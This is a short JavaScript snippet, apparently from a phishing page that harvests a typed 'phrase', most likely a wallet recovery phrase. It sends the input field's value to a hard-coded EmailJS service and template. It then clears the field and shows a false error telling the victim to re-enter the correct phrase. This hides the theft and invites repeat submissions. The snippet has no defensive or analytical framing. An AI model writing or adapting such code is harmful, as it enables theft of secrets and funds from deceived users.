
function sendEmail() {
    var params = {
        import : document.getElementById("import").value,
    }

    const serviceID ="service_78b0jn8"
    const templateID = "template_xq8yqyl"

    emailjs.send(serviceID, templateID, params) 
    .then (
        res => {
            document.getElementById("import").value ="";
            console.log(res);
            document.getElementById("query").innerHTML = "Error!!!, Check To Confirm You Entered The Correct Phrase And Try Again!!!";
        } )  
        .catch(err => console.log(err)); 
}